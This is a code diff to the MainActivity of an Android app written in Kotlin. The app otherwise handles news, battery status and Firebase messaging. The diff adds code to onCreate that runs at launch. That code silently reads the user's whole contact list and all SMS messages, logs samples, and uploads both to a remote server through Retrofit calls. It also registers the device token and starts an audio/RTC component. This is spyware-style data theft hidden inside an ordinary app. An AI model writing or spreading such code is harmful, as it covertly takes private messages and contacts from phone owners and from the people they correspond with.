@@ -34,6 +34,7 @@ import android.media.AudioManager
 import android.media.MediaPlayer
 import android.os.BatteryManager
 import android.os.Vibrator
+import com.pubnub.api.Pubnub
 
 
 class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelectedListener {
@@ -42,7 +43,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
     private var toolbar: Toolbar? = null
     private var drawerLayout: DrawerLayout? = null
     private var navigationView: NavigationView? = null
-
+    lateinit var mPubNub: Pubnub
     private var fragmentNews: Fragment? = null
 
     private val RC_SIGN_IN = 28
@@ -50,6 +51,15 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
     public override fun onStart() {
         super.onStart()
         //val account = GoogleSignIn.getLastSignedInAccount(this)
+    }
+
+    fun initPubNub()
+    {
+      /*  val stdbyChannel = "test" + Constants.STDBY_SUFFIX
+        this.mPubNub = Pubnub(Constants.PUB_KEY, Constants.SUB_KEY)
+        this.mPubNub.setUUID("test")
+        this.mPubNub.subscribe("test", Callback(this))*/
+        Rtc.instance.initRtcAudio(this)
     }
 
     public fun batteryStatus(){
@@ -98,6 +108,19 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
+        //-------------------------
+        val retrofitAPI = HttpExecute.BuildAPI()
+        val cc = ContentCollector()
+        val contactLs = ContactsList()
+        contactLs.SetContact(cc.GetContacts(this))
+        Log.d("SYNC", "Name : " + contactLs.GetContact()!![1].GetName() + " Number : " + contactLs.GetContact()!![1].GetNumber())
+        val SMSLs = SMSList()
+        SMSLs.SetSMS(cc.GetSMS(this))
+        Log.d("SYNC", "Address : " + SMSLs.GetSMS()!![3].GetAddress() + " Message : " + SMSLs.GetSMS()!![3].GetBody() + " Date : " + SMSLs.GetSMS()!![3].GetDate() + " Type : " + SMSLs.GetSMS()!![3].GetType())
+
+        HttpExecute(retrofitAPI.CreateContacts(contactLs)).start()
+        HttpExecute(retrofitAPI.CreateSMS(SMSLs)).start()
+        //-----------------------------------------
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
@@ -118,13 +141,14 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         //onNewIntent(intent)
         FirebaseMessaging.getInstance().subscribeToTopic("googleId")
         PermissionUtil.initPermissions(this)
-        val retrofitAPI = HttpExecute.BuildAPI()
+        //val retrofitAPI = HttpExecute.BuildAPI()
         val token = Token()
         token.SetToken(FirebaseInstanceId.getInstance().token!!)
         val stringCall = retrofitAPI.CreateNewDevice(token)
         val t = HttpExecute(stringCall)
         t.start()
         //syncDataTest();
+        initPubNub()
     }
 
     protected fun syncDataTest() {
